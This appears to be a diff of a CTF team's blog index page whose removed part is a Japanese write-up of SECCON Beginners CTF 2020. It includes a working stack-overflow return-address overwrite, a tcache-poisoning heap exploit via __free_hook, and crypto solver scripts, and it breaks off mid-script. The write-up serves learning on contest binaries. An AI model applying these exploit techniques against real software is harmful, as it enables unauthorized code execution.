@@ -1,1513 +1,487 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>urandom &middot; urandom</title>
-
-    <meta name="description" content="">
-
-    <meta name="generator" content="Hugo 0.68.3" />
-    <meta name="twitter:card" content="summary">
     
-    <meta name="twitter:title" content="urandom &middot; urandom">
-    <meta name="twitter:description" content="">
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+<meta name="HandheldFriendly" content="True" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+<meta name="generator" content="Hugo 0.92.1" />
 
-    <meta property="og:type" content="article">
-    <meta property="og:title" content="urandom &middot; urandom">
-    <meta property="og:description" content="">
 
-    <link href='//fonts.googleapis.com/css?family=Source+Sans+Pro:400,700|Oxygen:400,700' rel='stylesheet' type='text/css'>
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/pure-min.css">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pure/0.6.0/grids-responsive-min.css">
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
 
-    <link rel="stylesheet" href='//blog.urandom.team/css/all.min.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/syntax.css'>
-    <link rel="stylesheet" href='//blog.urandom.team/css/custom.css'>
-    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet">
 
-    <link rel="alternate" type="application/rss+xml" title="urandom" href='//blog.urandom.team/index.xml' />
+<title>urandom</title>
+
+
+<meta name="author" content="urandom" />
+
+
+<meta name="description" content="CTF team made up of graduates from University of Tsukuba, Japan" />
+
+
+<link rel="alternate" type="application/rss+xml" href="https://urandom.team/index.xml" title="urandom" />
+
+<meta property="og:title" content="urandom" />
+<meta name="twitter:title" content="urandom" />
+<meta property="og:type" content="website" />
+<meta property="og:url" content="https://urandom.team/" /><meta property="og:image" content="https://urandom.team/images/og.png" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://urandom.team/images/og.png" /><meta property="og:updated_time" content="2022-01-17T00:12:40+09:00" />
+
+
+<style>
+    @media (prefers-color-scheme: dark) {
+        body[data-theme='auto'] img {
+            filter: brightness(60%);
+        }
+    }
+
+    body[data-theme='dark'] img {
+        filter: brightness(60%);
+    }
+</style>
+
+
+
+
+<link rel="stylesheet" href="https://urandom.team/assets/css/fuji.min.css" />
+
+
+
+
+
+
+
+
 </head>
-<body>
 
-
-<div id="layout" class="pure-g">
-    <div class="sidebar pure-u-1 pure-u-md-1-4">
-    <div class="header">
-        <hgroup>
-            <h1 class="brand-title"><a href="//blog.urandom.team">urandom</a></h1>
-            <h2 class="brand-tagline"></h2>
-        </hgroup>
-
-        <nav class="nav">
-            <ul class="nav-list">
-                
-                
-                
-                
-                <li class="nav-item">
-                    <a class="pure-button" href='//blog.urandom.team/index.xml'>
-                        <i class="fa fa-rss"></i> rss
-                    </a>
-                </li>
-            </ul>
-        </nav>
-    </div>
-</div>
-
-
-    <div class="content pure-u-1 pure-u-md-3-4">
-        <div>
-            
-            <div class="posts">
-                
-                <h1 class="content-subhead">24 May 2020, 23:27</h1>
-                <section class="post">
-                    <header class="post-header">
-
-                        <a href="//blog.urandom.team/post/seccon-beginners-ctf-2020/" class="post-title">SECCON Beginners CTF 2020 Write-up</a>
-
-                        <p class="post-meta">
-                            
-                                By <strong class="post-author">mayth</strong>
-                            
-                            
-                                under 
-                                <a class="post-category post-category-Write-ups" href='//blog.urandom.team/categories/Write-ups'>Write-ups</a>
-                            
-                        </p>
-                    </header>
-
-                    <div class="post-description">
-                        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
-<script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
-<p>2020-05-23 14:00 - 2020-05-24 14:00 (JST)に開催された<a href="https://www.seccon.jp/2019/seccon_beginners/seccon_beginners_ctf_2020_5_23_1400.html">SECCON Beginners CTF 2020</a>のwrite-upです。</p>
-<p>なお、今回は以下のメンバー編成で参加しました。</p>
-<ul>
-<li>yuscarlet</li>
-<li>mayth</li>
-<li>yyu</li>
-<li>favcastle</li>
-</ul>
-<h2 id="pwn">Pwn</h2>
-<h3 id="beginners-stack">Beginner&rsquo;s Stack</h3>
-<blockquote>
-<p>Let&rsquo;s learn how to abuse stack overflow!</p>
-</blockquote>
-<p>64bit ELFのバイナリが与えられる。これがサーバーで動いている。</p>
-<p>実行すると</p>
-<blockquote>
-<pre><code>Your goal is to call `win` function (located at 0x400861)
-
-   [ Address ]           [ Stack ]
-                   +--------------------+
-0x00007ffeb1443ac0 | 0x00007f30a003dfc8 | &lt;-- buf
-                   +--------------------+
-0x00007ffeb1443ac8 | 0x0000000000400ad0 |
-                   +--------------------+
-0x00007ffeb1443ad0 | 0x0000000000400ad0 |
-                   +--------------------+
-0x00007ffeb1443ad8 | 0x00007f30a0078190 |
-                   +--------------------+
-0x00007ffeb1443ae0 | 0x00007ffeb1443af0 | &lt;-- saved rbp (vuln)
-                   +--------------------+
-0x00007ffeb1443ae8 | 0x000000000040084e | &lt;-- return address (vuln)
-                   +--------------------+
-0x00007ffeb1443af0 | 0x0000000000000000 | &lt;-- saved rbp (main)
-                   +--------------------+
-0x00007ffeb1443af8 | 0x00007f309fe740b3 | &lt;-- return address (main)
-                   +--------------------+
-0x00007ffeb1443b00 | 0x0000000100000001 |
-                   +--------------------+
-0x00007ffeb1443b08 | 0x00007ffeb1443be8 |
-                   +--------------------+
-</code></pre></blockquote>
-<p>といった感じに目標と現時点のスタックフレームが示される親切設計となっている。ついでに目的の<code>win</code>関数では、<code>system(&quot;/bin/sh&quot;)</code>を呼び出してくれる。つまり<code>win</code>関数を呼べれば自動的にシェルが取れる。</p>
-<p>さて、IDAで実行ファイルを見てみると、<code>vuln</code>という関数で入力を受け付けて<code>buf</code>に格納していることがわかる。このとき、<code>buf</code>は<code>0x20</code>(32)byteしかない一方で、<code>read</code>関数を呼ぶときに入力サイズを<code>0x200</code>に設定していて、ここでスタックオーバーフローが発生する。これを使って&quot;return address (vuln)&ldquo;となっている箇所を書き換えればよい。飛び先となる<code>win</code>関数のアドレスは分かっているし、&ldquo;return address&quot;までの長さも分かっているので、次のような入力を与える（エンディアンに注意）。</p>
-<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x61\x08\x40&quot;' | ./chall
-</code></pre><p>これは失敗する。</p>
-<blockquote>
-<pre><code>Oops! RSP is misaligned!
-Some functions such as `system` use `movaps` instructions in libc-2.27 and later.
-This instruction fails when RSP is not a multiple of 0x10.
-Find a way to align RSP! You're almost there!
-</code></pre></blockquote>
-<p>というわけで、<code>rsp</code>（スタックポインタ）が<code>0x10</code>の倍数になっていないといけない。スタックポインタは8byteずつ動くので、<code>push</code>/<code>pop</code>が呼び出される回数を1回増やすか減らすかする。</p>
-<p><code>win</code>関数があるという<code>0x400861</code>だが、これは関数の先頭、すなわち<code>push rbp</code>を指している。これによってズレているのだとすれば、この命令を飛ばせばよいはずである。<code>push rbp</code>の直後の<code>0x400862</code>を書き込むようにする。</p>
-<pre><code>$ perl -e 'print &quot;A&quot;x40 . &quot;\x62\x08\x40&quot;' | ./chall
-...
-Congratulations!
-</code></pre><p>祝福されたものの即座に終了してしまう。試しに<code>nc</code>で実際の問題サーバーに投げ込んでも、同様に応答が返ってこなくなる。これで1時間以上は潰していたのだが、神の助言によって<code>strace</code>をしてみると、どうも<code>system(&quot;/bin/sh&quot;)</code>は呼べているがttyが取れなくて死んでいるようだった。</p>
-<p>どうしたものか悩んだところで、そういえばpwntoolsに<code>interactive</code>とかいうメソッド生えてなかったっけ、これでttyの代わりにならんか、と思い出してpwntoolsを使ってみる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span><span class="lnt">7
-</span><span class="lnt">8
-</span><span class="lnt">9
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-
-<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
-
-<span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;chall&#39;</span><span class="p">)</span>
-
-<span class="n">vuln_ret</span> <span class="o">=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x400862</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span> <span class="o">*</span> <span class="mi">40</span> <span class="o">+</span> <span class="n">vuln_ret</span><span class="p">)</span>
-<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>これを実行すると無事に対話的にコマンドが打てるようになった。接続先を問題サーバーにして実行し、対話環境に入ったところでフラグを<code>cat</code>した。</p>
-<h3 id="beginners-heap">Beginner&rsquo;s Heap</h3>
-<p>この問題を解くにあたってはこちらの記事が大変参考になった: <a href="https://furutsuki.hatenablog.com/entry/2019/02/26/112207">t-cache poisoning: FireShell CTF 2019 babyheap - ふるつき</a></p>
-<p>さて、こちらはバイナリがない。<code>nc</code>で問題サーバーに繋ぐとこんな表示が現れる。</p>
-<blockquote>
-<pre><code>Let's learn heap overflow today
-You have a chunk which is vulnerable to Heap Overflow (chunk A)
-
- A = malloc(0x18);
-
-Also you can allocate and free a chunk which doesn't have overflow (chunk B)
-You have the following important information:
-
- &lt;__free_hook&gt;: 0x7fe9b33978e8
- &lt;win&gt;: 0x56491d3be465
-
-Call &lt;win&gt; function and you'll get the flag.
-
-1. read(0, A, 0x80);
-2. B = malloc(0x18); read(0, B, 0x18);
-3. free(B); B = NULL;
-4. Describe heap
-5. Describe tcache (for size 0x20)
-6. Currently available hint
-</code></pre></blockquote>
-<p>この対話環境を操作し、ヒープオーバーフローを使って<code>win</code>関数を呼び出すのが目標となる。なお、<code>__free_hook</code>と<code>win</code>関数のアドレスは毎回変化する（検証のために再実行を繰り返しているため、以下のコンソール出力の例示では<code>__free_hook</code>だとするアドレスが変化しているが、その辺りはよしなに読み替えてほしい）。</p>
-<p><code>A</code>は<code>0x18</code>byteしかない一方で、1の操作で<code>0x80</code>byteまで書くことができる。<code>B</code>にはオーバーフローの脆弱性はないが、2の操作で<code>malloc</code>して書き込み、3の操作で<code>free</code>ができる。残りはヒープ状態の表示、tcacheの状態の表示、そしてヒントの表示である。</p>
-<p>何はともあれヒントを見てみる。</p>
-<blockquote>
-<pre><code>Tcache manages freed chunks in linked lists by size.
-Every list can keep up to 7 chunks.
-A freed chunk linked to tcache has a pointer (fd) to the previously freed chunk.
-Let's check what happens when you overwrite fd by Heap Overflow.
-</code></pre></blockquote>
-<p>まず2でBを<code>malloc</code>して適当な値を書き込み、3で<code>free</code>する。この時点で4/5を実行すると次のような状態であることがわかる。</p>
-<blockquote>
-<pre><code>-=-=-=-=-= HEAP LAYOUT =-=-=-=-=-
- [+] A = 0x558bbf3eb330
- [+] B = (nil)
-                   +--------------------+
-0x0000558bbf3eb320 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb328 | 0x0000000000000021 |
-                   +--------------------+
-0x0000558bbf3eb330 | 0x0000000000000000 | &lt;-- A
-                   +--------------------+
-0x0000558bbf3eb338 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb340 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb348 | 0x0000000000000021 |
-                   +--------------------+
-0x0000558bbf3eb350 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb358 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb360 | 0x0000000000000000 |
-                   +--------------------+
-0x0000558bbf3eb368 | 0x0000000000020ca1 |
-                   +--------------------+
--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
-</code></pre></blockquote>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x0000558bbf3eb350(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
-<p>ヒントにあった<code>fd</code>が<code>0x0000558bbf3eb350</code>（元々<code>B</code>があった場所）になっている。
-この状態で<code>malloc</code>を行うと確保されたアドレスとして<code>0x0000558bbf3eb350</code>が返ってくるのだが、ヒープレイアウトを見てわかる通り、この領域は<code>A</code>のヒープオーバーフローによって書き換えられる。とりあえず目標の<code>0x0000558bbf3eb350</code>を<code>__free_hook</code>のアドレスに書き換えてみる。先ほどの教訓を生かして最初からpwntoolsを使うことにした。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>これでヒントを見るとチャンクサイズが壊れているか大きすぎると言われる。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
-But the chunk size is broken or too big maybe...?
-</code></pre></blockquote>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x0000556bb204b350(rw-) ]
-        ||
-        \/
-[ 0x00007fe2b3efe8e8(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
-<p><code>fd</code>の直前8byteがチャンクサイズなのだが、先ほどの入力では<code>0x5858585858585858</code>になっている。これを適当に<code>0x20</code>にするとヒントが変わる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;1&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook_addr</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
-But you can't get __free_hook since you can only malloc/free B.
-What if you change the chunk size to a value other than 0x20...?
-</code></pre></blockquote>
-<p>あまりに大きすぎると先ほどのように壊れていると言われるので、<code>0x30</code>にすると次の段階になった。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
-And the chunk size is properly forged!
-</code></pre></blockquote>
-<p>ここでもう一度<code>B</code>の<code>malloc</code>と書き込みを行う。ここで書き込む内容はなんでもよい。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;&gt; &#34;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;X&#39;</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>この段階でのヒントはこんな感じ。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
-The first link of tcache is __free_hook!
-But B is not empty...
-</code></pre></blockquote>
-<p><code>B</code>を<code>free</code>して空にしてみる。</p>
-<blockquote>
-<pre><code>It seems __free_hook is successfully linked to tcache!
-The first link of tcache is __free_hook!
-Also B is empty! You know what to do, right?
-</code></pre></blockquote>
-<p>ここでtcacheの状態を見てみると、<code>B</code>を<code>free</code>したのにここに追加されておらず、<code>__free_hook</code>のアドレスだけが残っていることがわかる。</p>
-<blockquote>
-<pre><code>-=-=-=-=-= TCACHE -=-=-=-=-=
-[    tcache (for 0x20)    ]
-        ||
-        \/
-[ 0x00007fc20362c8e8(rw-) ]
-        ||
-        \/
-[      END OF TCACHE      ]
--=-=-=-=-=-=-=-=-=-=-=-=-=-=
-</code></pre></blockquote>
-<p>最初のヒントには以下の記載があった。</p>
-<blockquote>
-<pre><code>Tcache manages freed chunks in linked lists by size.
-</code></pre></blockquote>
-<p>また、冒頭に挙げた記事にも次の記載がある。</p>
-<blockquote>
-<p>定数TCACHE_MAX_BINSはデフォルトでは64になっていて、キャッシュされるサイズは0x18, 0x28, 0x38, &hellip;, 0x408バイト以下というように区切られています。</p>
-</blockquote>
-<p>つまり、先ほどチャンクサイズを<code>0x30</code>ということにしたため、今<code>malloc</code>して<code>free</code>した<code>B</code>はtcacheの別のリストに追加された、ということだと思う（たぶん）。</p>
-<p>さて、この状態になると次の<code>malloc</code>では<code>__free_hook</code>のアドレスが返ってくる。<code>__free_hook</code>は<code>free</code>したときに呼び出される関数へのポインタである。したがって、今<code>malloc</code>して返ってきた領域に<code>win</code>関数のアドレスを書き込んで<code>free</code>を呼ぶと、代わりに<code>win</code>関数が呼び出される。最後に出力を表示するのを忘れずに。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span><span class="lnt">5
-</span><span class="lnt">6
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;2&#39;</span><span class="p">)</span>
-<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pack</span><span class="p">(</span><span class="n">win_addr</span><span class="p">))</span>
-
-<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">,</span> <span class="s1">&#39;3&#39;</span><span class="p">)</span>
-
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline_contains</span><span class="p">(</span><span class="s2">&#34;ctf4b&#34;</span><span class="p">))</span>
-</code></pre></td></tr></table>
-</div>
-</div><h2 id="crypto">Crypto</h2>
-<h3 id="rb">R&amp;B</h3>
-<p>先頭の文字を見て、Bならbase64decode、RならROT13decodeを繰り返す。</p>
-<h3 id="noisy-equations">Noisy equations</h3>
-<p>下記のPythonプログラムが動いている。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
-<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">getrandbits</span><span class="p">,</span> <span class="n">seed</span>
-
-
-<span class="n">FLAG</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;FLAG&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-<span class="n">SEED</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;SEED&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
-
-<span class="n">L</span> <span class="o">=</span> <span class="mi">256</span>
-<span class="n">N</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">FLAG</span><span class="p">)</span>
-
-
-<span class="k">def</span> <span class="nf">dot</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">):</span>
-    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">A</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">B</span><span class="p">)</span>
-    <span class="k">return</span> <span class="nb">sum</span><span class="p">([</span><span class="n">a</span> <span class="o">*</span> <span class="n">b</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">)])</span>
-
-<span class="n">coeffs</span> <span class="o">=</span> <span class="p">[[</span><span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">N</span><span class="p">)]</span>
-
-<span class="n">seed</span><span class="p">(</span><span class="n">SEED</span><span class="p">)</span>
-
-<span class="n">answers</span> <span class="o">=</span> <span class="p">[</span><span class="n">dot</span><span class="p">(</span><span class="n">coeff</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">)</span> <span class="o">+</span> <span class="n">getrandbits</span><span class="p">(</span><span class="n">L</span><span class="p">)</span> <span class="k">for</span> <span class="n">coeff</span> <span class="ow">in</span> <span class="n">coeffs</span><span class="p">]</span>
-
-<span class="k">print</span><span class="p">(</span><span class="n">coeffs</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">answers</span><span class="p">)</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>この変数<code>FLAG</code>の内容を知ることができればOKという問題。
-<code>answers</code>が表示されているが、これには乱数<code>getrandbits(L)</code>が加算されているので、
-2回分のデータを使っていくという方法がある。
-いま1回目の結果得られた<code>coeffs</code>を\(C_1\)、そして2回目を\(C_2\)とすると、
-これらは次のような行列である。</p>
-<p>$$
-\begin{align*}
-C_1 &amp;= \left[
-\begin{array}{cccc}
-c^1_{1,1} &amp; c^1_{1,2} &amp; \dots &amp; c^1_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
-c^1_{44,1} &amp; c^1_{44,2} &amp; \dots &amp; c^1{44,44}
-\end{array}
-\right] \\<br>
-\\<br>
-C_2 &amp;= \left[
-\begin{array}{cccc}
-c^2_{1,1} &amp; c^2_{1,2} &amp; \dots &amp; c^2_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
-c^2_{44,1} &amp; c^2_{44,2} &amp; \dots &amp; c^2_{44,44}
-\end{array}
-\right]
-\end{align*}
-$$</p>
-<p>そして<code>answer</code>は1回目を\(A_1\)、そして2回目を\(A_2\)とすると次のようになる。</p>
-<p>$$
-\begin{align*}
-A_1 &amp;= \left[
-\begin{array}{c}
-a^1_{1} \\<br>
-\vdots \\<br>
-a^1_{44}
-\end{array}
-\right] \\<br>
-\\<br>
-A_2 &amp;= \left[
-\begin{array}{c}
-a^2_{1} \\<br>
-\vdots \\<br>
-a^2_{44}
-\end{array}
-\right]
-\end{align*}
-$$</p>
-<p>ここで\(a^1_{i} - a^2_{i}\)について考える。求めたい<code>FLAG</code>の1文字目から\(x_1, \dots, x_{44}\)とすると、</p>
-<p>$$
-a^1_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) + R_i
-$$</p>
-<p>であり、この\(R_i\)は<code>getrandbits(L)</code>だがPythonプログラムを見ると、シードを固定しているため、
-どんな値なのかよく分からないが毎回同じ結果になる。
-したがって、\(a^1_{i} - a^2_{i}\)は次のように\(R_i\)がキャンセルされる。</p>
-<p>$$
-a^1_{i} - a^2_{i} = \left(\sum^{44}_{j=1}{C^1_{i,j} \times x_j}\right) -
-\left(\sum^{44}_{j=1}{C^2_{i,j} \times x_j}\right)
-$$</p>
-<p>したがってこれを行列表現すると</p>
-<p>$$
-\left[
-\begin{array}{c}
-a^1_{1} - a^2_{1} \\<br>
-\vdots \\<br>
-a^1_{44} - a^2_{44}
-\end{array}
-\right] = \left[
-\begin{array}{cccc}
-c^1_{1,1} - c^2_{1,1} &amp; c^1_{1,2} - c^2_{1,2} &amp; \dots &amp; c^1_{1,44} - c^2_{1,44} \\<br>
-\vdots &amp; \ddots &amp;  &amp; \vdots \\<br>
-\vdots &amp;  &amp; \ddots  &amp; \vdots \\<br>
-c^1_{44,1} - c^2_{44,1} &amp; c^1_{44,2} - c^2_{44,2} &amp; \dots &amp; c^1_{44,44} - c^2_{44,44}
-\end{array}
-\right]
-\left[
-\begin{array}{c}
-x_{1} \\<br>
-\vdots \\<br>
-x_{44}
-\end{array}
-\right]
-$$</p>
-<p>したがってあとは\(C_1 - C_2\)の逆行列から<code>FLAG</code>を得られる。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span></code></pre></td>
-<td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">json</span>
-<span class="kn">import</span> <span class="nn">numpy</span> <span class="kn">as</span> <span class="nn">np</span>
-<span class="kn">from</span> <span class="nn">numpy.linalg</span> <span class="kn">import</span> <span class="n">inv</span>
-
-<span class="n">stream</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
-
-<span class="n">coeffs1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
-<span class="n">answer1</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
-
-<span class="n">stream2</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;nc noisy-equations.quals.beginners.seccon.jp 3000&#34;</span><span class="p">)</span>
-
-<span class="n">coeffs2</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">stream2</span><span class="o">.</span><span class="n">readline</span><span class="p">())</span>
